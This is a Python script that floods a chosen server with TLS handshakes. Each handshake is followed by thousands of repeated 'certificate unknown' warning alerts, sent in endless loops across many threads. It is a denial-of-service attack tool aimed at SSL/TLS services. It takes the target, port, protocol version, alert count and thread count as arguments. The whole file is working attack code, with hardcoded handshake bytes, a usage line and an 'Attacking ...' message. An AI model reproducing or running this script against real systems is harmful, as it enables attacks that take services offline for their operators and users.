#!/usr/bin/python

import socket
import errno
from socket import error as socket_error
import threading
import os
import sys

def MAIN_CHECK(HOSTARG,PORTARG):
	s0 =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	result = s0.connect_ex((HOSTARG, PORTARG))
	s0.close()
	if result:
		print("https://"+HOST+":"+str(PORT)+" seems to be down? :(\nCheck if service is running or maybe we are blocked?")
		exit(1)

def SEDNALL():
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.settimeout(5)
			sock.connect((HOST, PORT))
			sock.send(final_client_hello)
			sock.send(final_client_alert)
			sock.close
		except socket_error as serr:
			pass

def INIT():
	try:
		while True:
			SEDNALL()
	except socket_error as serr:
		SEDNALL()


if len(sys.argv) != 6:
	print("\nUsage: python "+sys.argv[0]+" DOMAIN/IP PORT PROTOCOL-VERSION(SSLv3, TLS1.0, TLS1.1, TLS1.2) NUMBER-OF-ALERTS(1000) THREADS(50)\nUsage: python "+sys.argv[0]+" test.tdl 443 TLS1.2 1000 50\nCheck of the server supports the protocol before testing it ...")
	exit(1)

HOST, PORT = sys.argv[1], int(sys.argv[2])
MAIN_CHECK(HOST,PORT)

#SSL Client Hello
sslv3=b'\x16\x03\x00\x00\x8a\x01\x00\x00\x86\x03\x00\x08\x87\x37\x72\xa4\xc5\xb7\xee\x72\x1a\x28\x52\x95\x5f\x4e\x8b\x80\x33\x6e\x27\x49\x85\x33\x61\xa7\xeb\xbe\x70\xc7\x85\xab\x5b\x00\x00\x3e\xc0\x14\xc0\x0a\x00\x39\x00\x38\x00\x37\x00\x36\x00\x88\x00\x87\x00\x86\x00\x85\xc0\x0f\xc0\x05\x00\x35\x00\x84\xc0\x13\xc0\x09\x00\x33\x00\x32\x00\x31\x00\x30\x00\x45\x00\x44\x00\x43\x00\x42\xc0\x0e\xc0\x04\x00\x2f\x00\x41\x00\x05\x00\x04\x00\xff\x01\x00\x00\x1f\x00\x0b\x00\x04\x03\x00\x01\x02\x00\x0a\x00\x0a\x00\x08\x00\x17\x00\x19\x00\x18\x00\x16\x00\x23\x00\x00\x00\x0f\x00\x01\x01'
tls10=b'\x16\x03\x01\x00\x8a\x01\x00\x00\x86\x03\x01\x08\x87\x37\x72\xa4\xc5\xb7\xee\x72\x1a\x28\x52\x95\x5f\x4e\x8b\x80\x33\x6e\x27\x49\x85\x33\x61\xa7\xeb\xbe\x70\xc7\x85\xab\x5b\x00\x00\x3e\xc0\x14\xc0\x0a\x00\x39\x00\x38\x00\x37\x00\x36\x00\x88\x00\x87\x00\x86\x00\x85\xc0\x0f\xc0\x05\x00\x35\x00\x84\xc0\x13\xc0\x09\x00\x33\x00\x32\x00\x31\x00\x30\x00\x45\x00\x44\x00\x43\x00\x42\xc0\x0e\xc0\x04\x00\x2f\x00\x41\x00\x05\x00\x04\x00\xff\x01\x00\x00\x1f\x00\x0b\x00\x04\x03\x00\x01\x02\x00\x0a\x00\x0a\x00\x08\x00\x17\x00\x19\x00\x18\x00\x16\x00\x23\x00\x00\x00\x0f\x00\x01\x01'
tls11=b'\x16\x03\x02\x00\x8a\x01\x00\x00\x86\x03\x02\x08\x87\x37\x72\xa4\xc5\xb7\xee\x72\x1a\x28\x52\x95\x5f\x4e\x8b\x80\x33\x6e\x27\x49\x85\x33\x61\xa7\xeb\xbe\x70\xc7\x85\xab\x5b\x00\x00\x3e\xc0\x14\xc0\x0a\x00\x39\x00\x38\x00\x37\x00\x36\x00\x88\x00\x87\x00\x86\x00\x85\xc0\x0f\xc0\x05\x00\x35\x00\x84\xc0\x13\xc0\x09\x00\x33\x00\x32\x00\x31\x00\x30\x00\x45\x00\x44\x00\x43\x00\x42\xc0\x0e\xc0\x04\x00\x2f\x00\x41\x00\x05\x00\x04\x00\xff\x01\x00\x00\x1f\x00\x0b\x00\x04\x03\x00\x01\x02\x00\x0a\x00\x0a\x00\x08\x00\x17\x00\x19\x00\x18\x00\x16\x00\x23\x00\x00\x00\x0f\x00\x01\x01'
tls12=b'\x16\x03\x03\x00\x8a\x01\x00\x00\x86\x03\x03\x08\x87\x37\x72\xa4\xc5\xb7\xee\x72\x1a\x28\x52\x95\x5f\x4e\x8b\x80\x33\x6e\x27\x49\x85\x33\x61\xa7\xeb\xbe\x70\xc7\x85\xab\x5b\x00\x00\x3e\xc0\x14\xc0\x0a\x00\x39\x00\x38\x00\x37\x00\x36\x00\x88\x00\x87\x00\x86\x00\x85\xc0\x0f\xc0\x05\x00\x35\x00\x84\xc0\x13\xc0\x09\x00\x33\x00\x32\x00\x31\x00\x30\x00\x45\x00\x44\x00\x43\x00\x42\xc0\x0e\xc0\x04\x00\x2f\x00\x41\x00\x05\x00\x04\x00\xff\x01\x00\x00\x1f\x00\x0b\x00\x04\x03\x00\x01\x02\x00\x0a\x00\x0a\x00\x08\x00\x17\x00\x19\x00\x18\x00\x16\x00\x23\x00\x00\x00\x0f\x00\x01\x01'

#Client Alert - (Level: Warning, Description: Certificate Unknown)
alertsslv3=b'\x15\x03\x00\x00\x02\x01\x2e'
alerttls10=b'\x15\x03\x01\x00\x02\x01\x2e'
alerttls11=b'\x15\x03\x02\x00\x02\x01\x2e'
alerttls12=b'\x15\x03\x03\x00\x02\x01\x2e'

final_client_alert=b''
protocol_version_used=""

if str(sys.argv[3]) == "SSLv3":
	final_client_hello=sslv3
	use_client_alert=alertsslv3
	protocol_version_used="Using SSL v3 protocol"
elif str(sys.argv[3]) == "TLS1.0":
	final_client_hello=tls10
	use_client_alert=alerttls10
	protocol_version_used="Using TLS 1.0"
elif str(sys.argv[3]) == "TLS1.1":
	final_client_hello=tls11
	use_client_alert=alerttls11
	protocol_version_used="Using TLS 1.1 protocol"
elif str(sys.argv[3]) == "TLS1.2":
	final_client_hello=tls12
	use_client_alert=alerttls12
	protocol_version_used="Using TLS 1.2 protocol"
else:
	print("Error: PROTOCOL-VERSION must be SSLv3 or TLS1.0 or TLS1.1 or TLS1.2")
	exit(1)

try:
	numberofalerts=int(sys.argv[4])
except ValueError:
	print("Error: Number of Alerts must be interger - 1000 is a good start")
	exit(1)

try:
	numberofthreads=int(sys.argv[5])
except ValueError:
	print("Error: Number of Threads must be interger greater than 1 - 50 is a good start")
	exit(1)

if numberofthreads == 1 or numberofthreads == 0 or numberofthreads < 0:
	print("Error: Number of Threads must be interger greater than 1 - 50 is a good start")
	exit(1)

for x in range(1, numberofalerts):
	final_client_alert+=use_client_alert

threads = []
for n in range(1,numberofthreads):
	thread = threading.Thread(target=INIT)
	thread.setDaemon(True)
	thread.start()
	threads.append(thread)
alertsize=sys.getsizeof(final_client_alert)
print(protocol_version_used)
print("Size of the Client Alert payload: "+str(alertsize/1024)+"."+str(alertsize%1024)+" kilobytes")
print("Attacking ...")

try:
	for thread in threads:
		thread.join(999999)
except KeyboardInterrupt:
	print("\nExiting ...")
	os._exit(0)
